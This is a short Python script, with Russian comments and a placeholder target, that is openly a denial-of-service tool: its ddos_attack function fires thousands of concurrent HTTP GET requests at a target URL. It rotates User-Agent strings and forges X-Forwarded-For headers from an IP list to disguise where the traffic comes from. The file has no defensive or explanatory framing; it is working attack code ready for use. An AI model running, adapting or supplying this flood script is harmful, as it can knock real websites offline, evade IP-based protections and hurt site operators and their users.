import asyncio
import aiohttp
import random


TARGET_URL = "линк на сайт"  


def load_ips(filename="ips.txt"):
    with open(filename, "r") as f:
        return [line.strip() for line in f if line.strip()]


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/47.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/603.2.4 (KHTML, like Gecko)",
]


async def send_request(session, url, ip):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "X-Forwarded-For": ip,
        "Accept": "*/*",
        "Connection": "keep-alive",
    }
    try:
        async with session.get(url, headers=headers, timeout=10) as response:
            print(f"Request from {ip} - Status: {response.status}")
    except Exception as e:
        print(f"Error from {ip}: {e}")


async def ddos_attack(target_url, ips, concurrency=1000, total_requests=10000):
    connector = aiohttp.TCPConnector(ssl=False, limit=concurrency)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for _ in range(total_requests):
            ip = random.choice(ips)
            task = asyncio.create_task(send_request(session, target_url, ip))
            tasks.append(task)
            if len(tasks) >= concurrency:
                await asyncio.gather(*tasks)
                tasks = []
        if tasks:
            await asyncio.gather(*tasks)

if __name__ == "__main__":
    ip_list = load_ips("ips.txt") 
    concurrency_level = 500  # Количество параллельных запросов
    total_requests_count = 5000  # Общее количество запросов
    asyncio.run(ddos_attack(TARGET_URL, ip_list, concurrency=concurrency_level, total_requests=total_requests_count))
